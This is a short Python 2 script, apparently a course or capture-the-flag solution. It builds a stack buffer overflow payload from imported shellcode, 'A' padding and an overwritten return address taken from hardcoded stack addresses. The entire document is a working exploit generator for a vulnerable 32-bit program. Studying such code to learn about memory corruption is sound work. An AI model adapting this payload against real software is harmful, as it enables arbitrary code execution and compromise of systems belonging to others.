from shellcode import shellcode
from struct import pack

offset = 0xbffe9988 - 0xbffe9950;

print pack('<I', 0xFFFFFFFF) + shellcode + 'A' * (offset-len(shellcode)+4) + pack('<I', 0xbffe9950)
